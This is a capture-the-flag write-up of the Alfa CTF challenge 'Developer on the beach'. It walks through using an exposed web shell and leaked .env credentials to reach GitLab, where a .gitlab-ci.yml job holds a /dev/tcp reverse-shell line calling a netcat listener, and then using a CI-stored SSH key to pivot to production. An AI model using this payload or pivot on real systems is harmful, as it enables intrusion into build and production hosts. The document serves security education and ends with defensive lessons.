---
labels:
  - ctf
  - security
  - gitlab
---

# Alfa CTF: Developer on the beach

This was the first Alfa CTF challenge I solved and the first challenge where I
used a reverse shell. Every action described below took place inside the
purpose-built CTF environment.

The challenge description says:

> Your colleague is in more than a vacation mood: he has found the perfect
> balance of minimum effort and maximum time on the beach. His approach is
> simple: speed matters more than rules, convenience matters more than
> security, and collecting shells is better than writing tests. This philosophy
> leaves visible traces, and a careful observer can turn them into the key to
> the next flag.
>
> The relaxed developer's blog: `secretshell-s6xix3a7.alfactf.ru`

Opening the target shows a blog containing the developer's notes:

![Challenge website](assets/alfa-ctf-secret-shell-website.png)

The post about a web shell stands out. I first looked for a query parameter
that could lead to remote code execution, then ran `gobuster` to search for a
hidden directory. Eventually I tried `/shell.php` manually and found it.

![Web shell](assets/alfa-ctf-secret-shell-shell.png)

The web shell exposes credentials stored in `.env`. The next logical step is to
open the GitLab instance.

![Project in GitLab](assets/alfa-ctf-secret-shell-gitlab.png)

GitLab contains a project and a configured CI job. That suggests obtaining a
reverse shell through GitLab Runner. Inside the lab, start `netcat`, expose it
through a tunnel, and add this `.gitlab-ci.yml`:

```yaml
stages:
  - malicious

malicious:
  stage: malicious
  script:
    - /bin/sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

`IP` and `PORT` come from the active tunnel. Starting the pipeline creates a
shell in the `netcat` window:

```shell
svetsec@svetsec-laptop:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 60258
/bin/sh: 0: can't access tty; job control turned off
$ ls
README.md
assets
build
index.php
post-commit-directly-to-main.php
post-disable-tests.php
post-hardcode-secrets.php
post-logging-off.php
post-requirements-skim.php
post-web-shell.php
```

I spent quite a while exploring the runner without knowing where to go next.
The useful clue was in `.bash_history`:

```shell
$ cat .bash_history
ssh -i ~/.ssh/id_rsa prod@production
exit
$ ssh -i ~/.ssh/id_rsa prod@production
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
$ ssh -i ~/.ssh/id_rsa -T prod@production
Host key verification failed.
```

The connection stopped at `Host key verification failed`. In a noninteractive
environment, the `production` host key must be added to `known_hosts` first:

```shell
$ mkdir -p ~/.ssh
$ ssh-keyscan production >> ~/.ssh/known_hosts
# production:22 SSH-2.0-OpenSSH_10.0p2 Debian-7
```

Try the connection again:

```shell
$ ssh -T -i ~/.ssh/id_rsa prod@production
Warning: Permanently added the ECDSA host key for IP address '172.25.136.2'.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY.
ls
flag.txt
cat flag.txt
alfa{.........................}
```

The flag itself is not important here, so I redacted it. I enjoyed this
challenge a lot: I had never before used a reverse shell in a CTF solution,
especially through a CI runner.

The lesson for real systems is straightforward: do not leave web shells
deployed, expose secrets through readable `.env` files, execute untrusted
pipelines on privileged runners, or keep production SSH keys inside CI unless
they are strictly required and carefully isolated.
